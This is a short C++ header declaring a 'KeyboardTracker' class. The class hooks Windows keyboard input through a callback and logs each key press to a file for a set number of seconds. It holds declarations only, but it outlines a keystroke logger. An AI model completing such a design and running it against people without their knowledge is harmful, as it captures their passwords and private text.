#pragma once
#include "..\Libs\Header.h"

class KeyboardTracker {
public:
    KeyboardTracker();
    ~KeyboardTracker();

    bool StartTracking(const std::string& filename, int durationSeconds);
    void StopTracking();

private:
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    static void LogKeyPress(DWORD vkCode);

    static std::ofstream logFile;
    static bool isTracking;
    static std::chrono::system_clock::time_point endTime;
    static HHOOK keyboardHook;
};